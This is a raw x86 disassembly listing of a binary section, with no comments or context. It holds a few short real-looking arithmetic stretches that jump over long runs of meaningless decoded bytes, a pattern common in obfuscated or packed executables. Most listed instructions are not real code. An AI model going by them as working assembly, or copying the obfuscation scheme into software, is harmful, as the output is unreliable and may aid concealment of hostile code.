  40baa2:	mov    edi,0xc4558bea
  40baa7:	mov    edi,DWORD PTR [ebp-0x4]
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	addr16 loop 0x40babd
  40bacf:	fst    DWORD PTR [ebp-0x3583837d]
  40bad5:	jns    0x40bb53
  40bad7:	jl     0x40bad0
  40bad9:	inc    esp
  40bada:	dec    ebp
  40badb:	lds    eax,FWORD PTR [ebp-0x18]
  40bade:	outs   dx,BYTE PTR ds:[esi]
  40badf:	jmp    0x4627e99a
  40bae4:	rol    BYTE PTR [ecx-0x2d],cl
  40bae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae8:	xlat   BYTE PTR ds:[ebx]
  40bae9:	adc    al,BYTE PTR [ebx-0x46]
  40baec:	sbb    BYTE PTR [edx+0x1bd975c1],ch
  40baf2:	pop    edx
  40baf3:	or     BYTE PTR [edi+0x5f375519],al
  40baf9:	jo     0x40bb28
  40bafb:	or     ah,bh
  40bafd:	fisubr DWORD PTR [edx+edx*8+0x3]
  40bb01:	in     al,0x5a
  40bb03:	push   ss
  40bb04:	ja     0x40baed
  40bb06:	mov    edi,DWORD PTR [esi]
  40bb08:	aaa    
  40bb09:	sub    eax,0xa5e67461
  40bb0e:	dec    esp
  40bb0f:	in     al,0xa6
  40bb11:	push   ss
  40bb12:	(bad)
  40bb15:	mov    ch,0x73
  40bb17:	addr16 ret 0x448
  40bb1b:	sti    
  40bb1c:	push   esp
  40bb1d:	loope  0x40bb24
  40bb1f:	das    
  40bb20:	ret    
  40bb21:	ins    BYTE PTR es:[edi],dx
  40bb22:	lds    ebx,FWORD PTR [edi+eax*4+0xf26becc]
  40bb29:	retf   
  40bb2a:	out    0xda,eax
  40bb2c:	cwde   
  40bb2d:	jle    0x40baf9
  40bb2f:	loop   0x40bacc
  40bb31:	adc    BYTE PTR [esi+esi*8-0x19eb8ca4],ah
  40bb38:	out    dx,al
  40bb39:	ret    
  40bb3a:	(bad)  
  40bb3b:	jp     0x40bb16
  40bb3d:	push   ss
  40bb3e:	sub    esp,DWORD PTR [ebx]
  40bb40:	or     esp,esi
  40bb42:	pop    edx
  40bb43:	retf   
  40bb44:	lahf   
  40bb45:	xchg   esi,eax
  40bb46:	adc    DWORD PTR [edx],ebx
  40bb48:	scas   eax,DWORD PTR es:[edi]
  40bb49:	jae    0x40bbca
  40bb4b:	ins    BYTE PTR es:[edi],dx
  40bb4c:	nop
  40bb4d:	loop   0x40bbb2
  40bb4f:	enter  0x11cf,0x7f
  40bb53:	rol    BYTE PTR [ebx-0x9735a0a],cl
  40bb59:	jge    0x40baff
  40bb5b:	(bad)  
  40bb5c:	sar    BYTE PTR [edi],cl
  40bb5e:	xchg   ebx,eax
  40bb5f:	ins    DWORD PTR es:[edi],dx
  40bb60:	xor    edx,esp
  40bb62:	pop    eax
  40bb63:	arpl   WORD PTR [ebp+0x2337995],di
  40bb69:	in     eax,0xc7
  40bb6b:	lods   eax,DWORD PTR ds:[esi]
  40bb6c:	sub    BYTE PTR [edi-0x17],dh
  40bb6f:	dec    ebx
  40bb70:	xor    al,0xc7
  40bb72:	inc    edx
  40bb73:	sti    
  40bb74:	adc    BYTE PTR [ebp+0x624075fe],bl
  40bb7a:	jle    0x40bb66
  40bb7c:	xor    DWORD PTR [edi-0x31],ebp
  40bb7f:	mov    ds:0x2bc5660e,al
  40bb84:	dec    edi
  40bb85:	mov    cl,0x66
  40bb87:	sub    eax,edx
  40bb89:	pop    edx
  40bb8a:	fidiv  DWORD PTR [edi-0x4c]
  40bb8d:	push   cs
  40bb8e:	cli    
  40bb8f:	cld    
  40bb90:	pop    ebp
  40bb91:	aad    0x87
  40bb93:	add    al,0xb5
  40bb95:	jne    0x40bbd6
  40bb97:	xchg   ecx,eax
  40bb98:	outs   dx,BYTE PTR ds:[esi]
  40bb99:	ins    BYTE PTR es:[edi],dx
  40bb9a:	test   dh,0x3a
  40bb9d:	retf   
  40bb9e:	imul   BYTE PTR [ebx+eax*8]
  40bba1:	mov    al,ds:0x3cdc4696
  40bba6:	neg    DWORD PTR [ecx-0xa52a272]
  40bbac:	push   0x4916b241
  40bbb1:	out    0x77,al
  40bbb3:	sub    DWORD PTR [ebx+0x6e76040e],ebx
  40bbb9:	stc    
  40bbba:	mov    dl,0x55
  40bbbc:	jnp    0x40bb67
  40bbbe:	adc    eax,DWORD PTR [ebx+0x3d]
  40bbc1:	or     edx,DWORD PTR [ecx]
  40bbc3:	ror    BYTE PTR [ebx+0x1129a957],0x35
  40bbca:	mov    ch,0xb1
  40bbcc:	(bad)  
  40bbcd:	arpl   WORD PTR [eax-0x107badd8],di
  40bbd3:	(bad)  
  40bbd4:	mov    BYTE PTR [edi+0x2d30cb65],bh
  40bbda:	dec    eax
  40bbdb:	inc    edx
  40bbdc:	sub    BYTE PTR [esi],dh
  40bbde:	fist   WORD PTR [esi]
  40bbe0:	addr16 adc eax,0x7dce0d25
  40bbe6:	mov    BYTE PTR [eax+edi*4+0x15],cl
  40bbea:	pop    ecx
  40bbeb:	mov    edi,0xea347482
  40bbf0:	inc    ebx
  40bbf1:	test   eax,0xab0d9da6
  40bbf6:	call   0xbb0983ec
  40bbfb:	call   0xe95e:0xe18ca9c2
  40bc02:	popa   
  40bc03:	daa    
  40bc04:	stos   BYTE PTR es:[edi],al
  40bc05:	sbb    DWORD PTR [edx],ebp
  40bc07:	(bad)  [ecx]
  40bc09:	vpand  ymm1,ymm1,YMMWORD PTR [ebp+0x22]
  40bc0e:	dec    edi
  40bc0f:	cmp    eax,0xa7e143fc
  40bc14:	rcl    esi,0x11
  40bc17:	jecxz  0x40bbc5
  40bc19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc1a:	xor    ecx,DWORD PTR [ebx]
  40bc1c:	add    al,0x5b
  40bc1e:	add    ah,BYTE PTR [edi]
  40bc20:	rcr    DWORD PTR [eax],0x92
  40bc23:	mov    al,BYTE PTR [ebx-0xe06e9ee]
  40bc29:	daa    
  40bc2a:	les    edx,FWORD PTR [eax+0x68]
  40bc2d:	dec    ebx
  40bc2e:	pop    edi
  40bc2f:	jle    0x40bbb1
  40bc31:	scas   eax,DWORD PTR es:[edi]
  40bc32:	nop
  40bc33:	dec    eax
  40bc34:	and    BYTE PTR ds:0xd16b8f74,cl
  40bc3a:	fnsave [edi+ecx*8+0x4b]
  40bc3e:	cmp    BYTE PTR [ecx-0x753dc83c],0xf3
  40bc45:	mov    edi,esp
  40bc47:	scas   al,BYTE PTR es:[edi]
  40bc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc49:	(bad)  
  40bc4a:	jnp    0x40bc9a
  40bc4c:	xor    DWORD PTR ds:0x6f2e944a,0xb65fd70f
  40bc56:	ja     0x40bc8a
  40bc58:	inc    edx
  40bc59:	mov    bh,0x79
  40bc5b:	imul   esi,DWORD PTR [edx-0x3b512e0b],0xeb929061
  40bc65:	inc    esi
  40bc66:	or     BYTE PTR [eax+0x7108a4c3],ah
  40bc6c:	ins    DWORD PTR es:[edi],dx
  40bc6d:	mul    BYTE PTR [ecx]
  40bc6f:	and    dh,BYTE PTR [eax-0x66]
  40bc72:	add    eax,0x32225ef2
  40bc77:	adc    eax,0x9fb54b83
  40bc7c:	test   BYTE PTR [edx+0x53ceccf3],0xc3
  40bc83:	daa    
  40bc84:	jmp    0x3755:0x1d2cd8ea
  40bc8b:	arpl   WORD PTR [ecx-0x2c],bp
  40bc8e:	in     eax,0xbb
  40bc90:	and    esi,DWORD PTR [edi+0x4c35676e]
  40bc96:	icebp  
  40bc97:	pop    eax
  40bc98:	dec    ebx
  40bc99:	aam    0x46
  40bc9b:	adc    edi,edx
  40bc9d:	cmc    
  40bc9e:	jmp    0x40bc75
  40bca0:	mov    WORD PTR [edx+esi*4-0x20ac37f4],fs
  40bca7:	or     esp,DWORD PTR [eax-0x6e]
  40bcaa:	push   esi
  40bcab:	cmp    DWORD PTR [eax-0x1e12287f],ebp
  40bcb1:	repz jp 0x40bd05
  40bcb4:	in     eax,dx
  40bcb5:	jecxz  0x40bd25
  40bcb7:	les    ebp,FWORD PTR [edx-0x3c20528e]
  40bcbd:	inc    esi
  40bcbe:	and    BYTE PTR [ecx-0x757d61da],bl
  40bcc4:	jg     0x40bd30
  40bcc6:	cdq    
  40bcc7:	push   eax
  40bcc8:	int3   
  40bcc9:	lods   eax,DWORD PTR ds:[esi]
  40bcca:	jno    0x40bd38
  40bccc:	loopne 0x40bcbd
  40bcce:	or     ebp,DWORD PTR [ecx-0x55]
  40bcd1:	fdivr  st(0),st
  40bcd3:	sbb    al,BYTE PTR [ecx+0x41]
  40bcd6:	ror    BYTE PTR [ebp+0x5a57e0dc],1
  40bcdc:	int3   
  40bcdd:	shufps xmm4,xmm6,0xd1
  40bce1:	and    dl,BYTE PTR [edx]
  40bce3:	add    DWORD PTR [ecx],ecx
  40bce5:	push   ebx
  40bce6:	daa    
  40bce7:	fwait
  40bce8:	cld    
  40bce9:	icebp  
  40bcea:	lods   al,BYTE PTR ds:[esi]
  40bceb:	sbb    bh,BYTE PTR [esp+ebp*2-0xe]
  40bcef:	fnstenv [edx-0x1a1494d4]
  40bcf5:	popa   
  40bcf6:	or     bh,ch
  40bcf8:	mov    dh,0x4e
  40bcfa:	cwde   
  40bcfb:	call   0xc9cc894
  40bd00:	pop    sp
  40bd02:	adc    al,BYTE PTR [edi-0x65]
  40bd05:	outs   dx,DWORD PTR ds:[esi]
  40bd06:	into   
  40bd07:	(bad)  
  40bd08:	int    0x6
  40bd0a:	jg     0x40bd72
  40bd0c:	and    ebx,DWORD PTR [ecx]
  40bd0e:	sub    al,0x70
  40bd10:	mov    ebp,0x4a9c3cf1
  40bd15:	pop    esi
  40bd16:	mov    ds:0x3b4d7680,al
  40bd1b:	scas   al,BYTE PTR es:[edi]
  40bd1c:	mov    al,0xbc
  40bd1e:	adc    al,0xae
  40bd20:	push   0x4e
  40bd22:	lds    esi,FWORD PTR es:[eax-0x75]
  40bd26:	adc    al,0xc4
  40bd28:	jno    0x40bd2f
  40bd2a:	call   0xf63d8d53
  40bd2f:	xchg   ecx,eax
  40bd30:	cmp    eax,0x59354a19
  40bd35:	fild   DWORD PTR [ebp+0x9]
  40bd38:	mov    eax,ds:0x31307d00
  40bd3d:	mov    bh,BYTE PTR [edi-0x6c28bf71]
  40bd43:	or     cl,dl
  40bd45:	mov    esi,0xbd65e69a
  40bd4a:	sahf   
  40bd4b:	fwait
  40bd4c:	shl    BYTE PTR [edx],cl
  40bd4e:	popa   
  40bd4f:	das    
  40bd50:	js     0x40bd1d
  40bd52:	jns    0x40bd03
  40bd54:	rcr    DWORD PTR [ebx],cl
  40bd56:	inc    ebx
  40bd57:	imul   esp,ebx,0xacf58b66
  40bd5d:	mov    ds:0x260e2409,al
  40bd62:	pop    ebp
  40bd63:	pusha  
  40bd64:	ret    
  40bd65:	jne    0x40bcf1
  40bd67:	ret    0xce15
  40bd6a:	sub    ch,BYTE PTR [eax+0x4d]
  40bd6d:	add    al,0xdc
  40bd6f:	aad    0xd5
  40bd71:	or     ah,dh
  40bd73:	and    al,0x50
  40bd75:	pop    ds
  40bd76:	loop   0x40bd75
  40bd78:	loop   0x40bd53
  40bd7a:	inc    ecx
  40bd7b:	push   eax
  40bd7c:	icebp  
  40bd7d:	fucomp st(6)
  40bd7f:	dec    edx
  40bd80:	jecxz  0x40bda8
  40bd82:	mov    DWORD PTR [eax+0x285ca0a5],0x9342d19b
  40bd8c:	js     0x40bd75
  40bd8e:	sub    DWORD PTR [ebp+esi*4+0x38c71c90],ebx
  40bd95:	aad    0x1a
  40bd97:	jg     0x40bd9d
  40bd99:	push   ss
  40bd9a:	mov    esi,0xf10fbcf0
  40bd9f:	fnstsw WORD PTR [ebx-0x79d9126d]
  40bda5:	shr    DWORD PTR [esi],1
  40bda7:	jns    0x40bd74
  40bda9:	sub    BYTE PTR [ecx],ch
  40bdab:	mov    gs,WORD PTR [ebp+esi*2+0x6]
  40bdaf:	sbb    al,0x1d
  40bdb1:	in     al,dx
  40bdb2:	jp     0x40bd3a
  40bdb4:	cmp    al,0x54
  40bdb6:	lods   eax,DWORD PTR ds:[esi]
  40bdb7:	adc    DWORD PTR [ecx-0x25],esp
  40bdba:	cli    
  40bdbb:	cmp    bh,ch
  40bdbd:	cmp    ecx,DWORD PTR [eax+0x16]
  40bdc0:	lock or ecx,esp
  40bdc3:	mov    DWORD PTR [edx-0x23],0xc92ef33b
  40bdca:	inc    eax
  40bdcb:	rcl    BYTE PTR [ebp+0x350c827f],0x91
  40bdd2:	cmp    edi,DWORD PTR [ecx]
  40bdd4:	xchg   ebp,eax
  40bdd5:	mov    eax,0xfcdfbd07
  40bdda:	stc    
  40bddb:	leave  
  40bddc:	mov    ch,0x22
  40bdde:	xchg   BYTE PTR [esi-0x3277b840],al
  40bde4:	mov    eax,cs
  40bde6:	adc    BYTE PTR [edi+0x3e],0x6e
  40bdea:	and    eax,0xe8d1bb2
  40bdef:	out    0xb9,eax
  40bdf1:	mov    eax,0x6276882
  40bdf6:	cld    
  40bdf7:	sub    esi,ebp
  40bdf9:	lock lock push ss
  40bdfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdfd:	pop    ebx
  40bdfe:	jbe    0x40bda4
  40be00:	mov    ebp,0xde6b38fd
  40be05:	sub    eax,0xf02002f1
  40be0a:	and    al,0x83
  40be0c:	mov    dh,0x43
  40be0e:	shl    bl,1
  40be10:	cmp    esp,DWORD PTR [esi]
  40be12:	add    DWORD PTR [ecx+0x64],edi
  40be15:	aad    0x2a
  40be17:	mov    ebx,0x8b45d294
  40be1c:	mov    edi,0x7b5a66eb
  40be21:	jb     0x40be92
  40be23:	mov    dh,0xd6
  40be25:	mov    eax,0x29e55ebb
  40be2a:	ins    DWORD PTR es:[edi],dx
  40be2b:	fadd   DWORD PTR [ebp-0x23aa7677]
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	(bad)  
  40be66:	sahf   
  40be67:	aad    0xfa
  40be69:	arpl   WORD PTR [esp+edi*2+0x7c79ca7c],cx
  40be70:	jl     0x40be62
  40be72:	je     0x40beb4
  40be74:	cmp    eax,0x4e08c943
  40be79:	xchg   DWORD PTR [esi+0x16],ebx
  40be7c:	xchg   ebp,eax
  40be7d:	inc    ecx
  40be7e:	pushf  
  40be7f:	adc    cl,bl
  40be81:	xchg   ecx,eax
  40be82:	inc    DWORD PTR [ebx-0x42d337c7]
  40be88:	sub    DWORD PTR [eax-0x1c89c2c2],edx
  40be8e:	das    
  40be8f:	leave  
  40be90:	dec    esi
  40be91:	mov    DWORD PTR [edi+0xf],eax
  40be94:	xchg   BYTE PTR [esi+eiz*2-0x69],cl
  40be98:	adc    ebx,DWORD PTR [edi-0x71a88471]
  40be9e:	jl     0x40be21
  40bea0:	or     DWORD PTR [edi+0x3d],ecx
  40bea3:	retf   
  40bea4:	repz cmc 
  40bea6:	(bad)  [esi]
  40bea8:	leave  
  40bea9:	jge    0x40bea0
  40beab:	xchg   BYTE PTR [esi-0x1e],dh
  40beae:	gs std 
  40beb0:	les    ecx,FWORD PTR [edx-0x34f0ba5e]
  40beb6:	push   ebx
  40beb7:	es pop ds
  40beb9:	lea    eax,[ebx*2+0x61427114]
  40bec0:	jmp    0x40bf2d
  40bec2:	loope  0x40beaf
  40bec4:	jmp    0x5ac0:0xb0e812fb
  40becb:	jg     0x40bf27
  40becd:	xchg   ecx,eax
  40bece:	mov    ds:0x3bba56ee,eax
  40bed3:	jmp    0xe1cb:0x96442355
  40beda:	push   es
  40bedb:	or     bl,al
  40bedd:	mov    edx,0xa0e513dd
  40bee2:	inc    edx
  40bee3:	xor    eax,DWORD PTR [edx+0x13c2c4bc]
  40bee9:	mov    ds:0x22fec9af,eax
  40beee:	push   ebp
  40beef:	jmp    0x40bf31
  40bef1:	nop
  40bef2:	call   0x8b08:0x47e954aa
  40bef9:	mov    ch,0x14
  40befb:	inc    ebx
  40befc:	xor    al,0x7
  40befe:	aas    
  40beff:	(bad)  [esi]
  40bf01:	mov    ebx,0x238b2944
  40bf06:	inc    ebx
  40bf07:	stos   DWORD PTR es:[edi],eax
  40bf08:	mov    ecx,0xa6eb392a
  40bf0d:	add    bh,dh
  40bf0f:	push   ebx
  40bf10:	xchg   esi,eax
  40bf11:	or     dl,BYTE PTR [esi+0x7e]
  40bf14:	jp     0x40bf8b
  40bf16:	(bad)  
  40bf17:	call   0x4cb37787
  40bf1c:	jge    0x40bee3
  40bf1e:	xchg   ecx,eax
  40bf1f:	pop    eax
  40bf20:	call   0x38b1:0x8f899e2a
  40bf27:	sbb    BYTE PTR [ebp+0x78],bh
  40bf2a:	out    dx,eax
  40bf2b:	retf   0x5cfa
  40bf2e:	jno    0x40bf6f
  40bf30:	(bad)  
  40bf31:	repnz mov al,0x9a
  40bf34:	cs dec ecx
  40bf36:	stos   DWORD PTR es:[edi],eax
  40bf37:	lahf   
  40bf38:	fst    QWORD PTR [esp+ecx*1]
  40bf3b:	push   esp
  40bf3c:	push   ds
  40bf3d:	sub    cl,cl
  40bf3f:	sbb    eax,0x78211498
  40bf44:	xchg   ecx,eax
  40bf45:	or     DWORD PTR [edx],ecx
  40bf47:	loop   0x40beed
  40bf49:	pop    ss
  40bf4a:	xor    al,0xae
  40bf4c:	xlat   BYTE PTR ds:[ebx]
  40bf4d:	adc    al,0x97
  40bf4f:	xor    esp,DWORD PTR cs:[ecx]
  40bf52:	in     al,0xd
  40bf54:	fdivr  QWORD PTR [eax+edx*1-0x4807e0d9]
  40bf5b:	pop    ecx
  40bf5c:	or     al,0x61
  40bf5e:	out    dx,eax
  40bf5f:	mov    edx,es
  40bf61:	cmc    
  40bf62:	inc    edi
  40bf63:	cmp    dl,BYTE PTR [edx+0x62]
  40bf66:	retf   
  40bf67:	xor    eax,DWORD PTR [ebx+0x74]
  40bf6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf6b:	arpl   WORD PTR [ebx-0x10a1ef43],bp
  40bf71:	mov    cl,0xe8
  40bf73:	je     0x40bef6
  40bf75:	(bad)  
  40bf76:	(bad)  
  40bf78:	iret   
  40bf79:	cmc    
  40bf7a:	pushf  
  40bf7b:	or     al,dl
  40bf7d:	aad    0x65
  40bf7f:	mov    edi,0xa1d5eaf0
  40bf84:	dec    eax
  40bf85:	xchg   esi,eax
  40bf86:	pop    es
  40bf87:	loop   0x40bf82
  40bf89:	mov    esi,0x97144927
  40bf8e:	dec    ecx
  40bf8f:	inc    ebp
  40bf90:	xor    al,0xea
  40bf92:	ja     0x40bfb8
  40bf94:	add    ecx,DWORD PTR [ebp+0x6c88e188]
  40bf9a:	and    BYTE PTR [ebx],al
  40bf9c:	cs add eax,0x33bde424
  40bfa2:	mov    al,ds:0x24babdf1
  40bfa7:	stc    
  40bfa8:	lahf   
  40bfa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfaa:	xor    DWORD PTR [ecx+0x59],ecx
  40bfad:	je     0x40bfba
  40bfaf:	jge    0x40bf62
  40bfb1:	push   ebx
  40bfb2:	jge    0x40c01d
  40bfb4:	cmp    DWORD PTR [edx],esp
  40bfb6:	arpl   ax,si
  40bfb8:	xchg   edx,eax
  40bfb9:	push   es
  40bfba:	sub    al,0x7c
  40bfbc:	pop    eax
  40bfbd:	loope  0x40bf52
  40bfbf:	(bad)  
  40bfc0:	or     esi,ebx
  40bfc2:	cmp    ecx,DWORD PTR [esi+0x55]
  40bfc5:	test   esi,esp
  40bfc7:	xor    ebx,DWORD PTR [edi]
  40bfc9:	xor    bh,BYTE PTR [eax+ecx*1-0x50]
  40bfcd:	loopne 0x40bf89
  40bfcf:	xor    dl,BYTE PTR [esi]
  40bfd1:	ror    dh,0x86
  40bfd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfd5:	push   esi
  40bfd6:	jecxz  0x40bfe7
  40bfd8:	pop    esi
  40bfd9:	jl     0x40c056
  40bfdb:	outs   dx,BYTE PTR ds:[esi]
  40bfdc:	jne    0x40bfa5
  40bfde:	xor    edx,edx
  40bfe0:	(bad)  
  40bfe2:	adc    eax,0x8a91f38b
  40bfe7:	pop    ebp
  40bfe8:	call   0xcb24a610
  40bfed:	loopne 0x40bfbe
  40bfef:	adc    al,0x4c
  40bff1:	xchg   edi,eax
  40bff2:	adc    BYTE PTR [ebp+0x74],dh
  40bff5:	es aaa 
  40bff7:	jno    0x40c01c
  40bff9:	sub    DWORD PTR [edx],ebx
  40bffb:	gs sahf 
  40bffd:	lods   eax,DWORD PTR ds:[esi]
  40bffe:	or     eax,0x473584e4
  40c003:	mov    WORD PTR [edi+edx*8+0x415e58c2],es
  40c00a:	mov    bh,0xf4
  40c00c:	pop    ebp
  40c00d:	cli    
  40c00e:	stos   DWORD PTR es:[edi],eax
  40c00f:	push   0x947ea8e9
  40c014:	jg     0x40c06f
  40c016:	fstp   QWORD PTR [edi+0x2e]
  40c019:	call   0x671d:0x475c85e4
  40c020:	test   eax,0xface13a4
  40c025:	fstp   TBYTE PTR [eax]
  40c027:	sbb    DWORD PTR [eax],edi
  40c029:	mov    esp,0xa7eaf700
  40c02e:	in     eax,0x2f
  40c030:	push   0x7
  40c032:	cwde   
  40c033:	cmp    DWORD PTR [esi+0x1a],esi
  40c036:	aad    0x78
  40c038:	dec    eax
  40c039:	(bad)  
  40c03a:	mov    dh,0xcb
  40c03c:	popa   
  40c03d:	mov    esp,0xc77142c3
  40c042:	vcmpps ymm5,ymm7,YMMWORD PTR [eax+0x2356f536],0x69
  40c04b:	push   es
  40c04c:	shl    ebx,1
  40c04e:	xor    al,0xef
  40c050:	pop    ebp
  40c051:	cld    
  40c052:	push   ds
  40c053:	ins    DWORD PTR es:[edi],dx
  40c054:	xchg   ebx,eax
  40c055:	xchg   ebp,eax
  40c056:	add    eax,0xaaaeda13
  40c05b:	fist   DWORD PTR [ebp-0x7aa6645]
  40c061:	cs es mov esp,0x7bf1339a
  40c068:	adc    eax,0x4d6322a0
  40c06d:	jns    0x40c08b
  40c06f:	dec    eax
  40c070:	and    dh,BYTE PTR ds:0xcaa96372
  40c076:	shl    DWORD PTR [edi],cl
  40c078:	fst    st(4)
  40c07a:	pop    esi
  40c07b:	and    DWORD PTR [ecx],ebx
  40c07d:	pop    ecx
  40c07e:	cmp    al,0x1b
  40c080:	xchg   BYTE PTR [edx+0x138d683d],ch
  40c086:	test   al,0xa2
  40c088:	jbe    0x40c0c3
  40c08a:	adc    al,0x12
  40c08c:	sub    al,0x31
  40c08e:	xor    al,0x3a
  40c090:	pop    DWORD PTR [edi-0x77]
  40c093:	pop    ebx
  40c094:	sub    dh,BYTE PTR [eax-0x124f18e4]
  40c09a:	jecxz  0x40c08e
  40c09c:	lock inc esp
  40c09e:	cmp    al,0x7
  40c0a0:	popf   
  40c0a1:	add    ecx,DWORD PTR [ecx+0x3b49743f]
  40c0a7:	and    eax,DWORD PTR [ebp+0x3a]
  40c0aa:	(bad)  
  40c0ac:	icebp  
  40c0ad:	jmp    0xb7e6:0xedb3abf3
  40c0b4:	loope  0x40c0e6
  40c0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0b7:	pop    eax
  40c0b8:	fsubr  st,st(7)
  40c0ba:	mov    eax,ds:0x49352bf4
  40c0bf:	sub    cl,dl
  40c0c1:	jmp    0xeab124de
  40c0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c7:	(bad)  
  40c0c8:	call   0x669504ef
  40c0cd:	mov    dl,0x87
  40c0cf:	xor    BYTE PTR [ebx-0x3ef541e7],ah
  40c0d5:	cs xchg ecx,eax
  40c0d7:	dec    esp
  40c0d8:	and    BYTE PTR cs:[edx],bh
  40c0db:	fwait
  40c0dc:	add    eax,0x10eafe3b
  40c0e1:	jbe    0x40c0d8
  40c0e3:	out    0xc6,al
  40c0e5:	add    DWORD PTR [ebx+0x5b],ecx
  40c0e8:	sbb    cl,BYTE PTR [edx+0x7cd01016]
  40c0ee:	jecxz  0x40c121
  40c0f0:	cmp    BYTE PTR [esi],ah
  40c0f2:	arpl   bx,ax
  40c0f4:	pop    ebp
  40c0f5:	cli    
  40c0f6:	pop    ecx
  40c0f7:	(bad)  
  40c0f8:	jge    0x40c0e0
  40c0fa:	cli    
  40c0fb:	or     al,0xeb
  40c0fd:	mov    eax,0x213a4808
  40c102:	push   edi
  40c103:	cli    
  40c104:	mov    ss,WORD PTR [eax-0x1b]
  40c107:	mov    BYTE PTR [esi],ah
  40c109:	mov    eax,0x66f0805e
  40c10e:	repz inc edi
  40c110:	stos   DWORD PTR es:[edi],eax
  40c111:	or     ebp,esp
  40c113:	mov    edi,0xf6bc9ee2
  40c118:	xchg   ebp,eax
  40c119:	test   al,dh
  40c11b:	out    dx,al
  40c11c:	adc    al,0xa0
  40c11e:	loope  0x40c14c
  40c120:	loope  0x40c193
  40c122:	sar    DWORD PTR [ecx+0x33c330f0],0x5a
  40c129:	retf   
  40c12a:	inc    ebp
  40c12b:	pop    ds
  40c12c:	cdq    
  40c12d:	xchg   ebp,eax
  40c12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c12f:	or     DWORD PTR [edi-0x74],ecx
  40c132:	add    ecx,DWORD PTR ds:0x8de610d6
  40c138:	enter  0x91c7,0x28
  40c13c:	mov    ds:0xd58b2085,eax
  40c141:	pop    esp
  40c142:	mov    ds:0x739f38ed,eax
  40c147:	pop    ds
  40c148:	fdivp  st(2),st
  40c14a:	scas   eax,DWORD PTR es:[edi]
  40c14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c14c:	mov    edi,0xb24ce76d
  40c151:	jmp    DWORD PTR [eax]
  40c153:	inc    ebx
  40c154:	or     eax,0x13e07a0e
  40c159:	imul   edx,DWORD PTR [ebx+0x67],0xb0f6aed8
  40c160:	sbb    al,0xfc
  40c162:	fwait
  40c163:	je     0x40c16b
  40c165:	enter  0xbcdf,0xda
  40c169:	sahf   
  40c16a:	hlt    
  40c16b:	add    DWORD PTR [eax-0x4b70fd39],edx
  40c171:	in     eax,dx
  40c172:	repnz inc esi
  40c174:	mov    edi,0x3c39f7f1
  40c179:	jb     0x40c189
  40c17b:	fcomp  QWORD PTR [esp+edx*4+0x746e2f2b]
  40c182:	cld    
  40c183:	outs   dx,DWORD PTR ds:[esi]
  40c184:	add    BYTE PTR [edi+0x3b],bh
  40c187:	(bad)
  40c18b:	shr    esi,0x3a
  40c18e:	stc    
  40c18f:	mov    al,ds:0xdbc7fd34
  40c194:	or     eax,0x53c6fc21
  40c199:	cs push ebp
  40c19b:	sbb    DWORD PTR [ecx+ebp*4+0x8],eax
  40c19f:	mov    edx,0x5b502454
  40c1a4:	xor    ebx,DWORD PTR [eax-0x62873c1f]
  40c1aa:	outs   dx,DWORD PTR ds:[esi]
  40c1ab:	sbb    ebx,DWORD PTR ds:[ebx-0x64d1d096]
  40c1b2:	or     eax,0x43617b28
  40c1b7:	mov    cl,0xe7
  40c1b9:	mov    dl,0xb3
  40c1bb:	stc    
  40c1bc:	cwde   
  40c1bd:	in     al,0x1e
  40c1bf:	xor    DWORD PTR [esi-0x12],ebx
  40c1c2:	push   cs
  40c1c3:	cmp    DWORD PTR [eax+edi*2],edx
  40c1c6:	or     eax,DWORD PTR [ebx]
  40c1c8:	shr    ecx,1
  40c1ca:	ror    DWORD PTR [edx],0x0
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	jmp    DWORD PTR [eax-0x77c6cdbb]
  40c1e5:	jl     0x40c263
  40c1e7:	retf   0x7c79
  40c1ea:	jl     0x40c1f4
  40c1ec:	std    
  40c1ed:	rol    BYTE PTR [edi-0x54],1
  40c1f0:	lods   al,BYTE PTR ds:[esi]
  40c1f1:	jb     0x40c266
  40c1f3:	push   0x45
  40c1f5:	mov    BYTE PTR [edi-0x42],dh
  40c1f8:	imul   edx,DWORD PTR [edx+ecx*8],0x36858b5b
  40c1ff:	cli    
  40c200:	in     eax,0xed
  40c202:	ds imul esi,esp,0x34
  40c206:	add    al,0xeb
  40c208:	cwde   
  40c209:	pop    ebx
  40c20a:	daa    
  40c20b:	les    edx,FWORD PTR [ebp+0x430b9135]
  40c211:	jbe    0x40c289
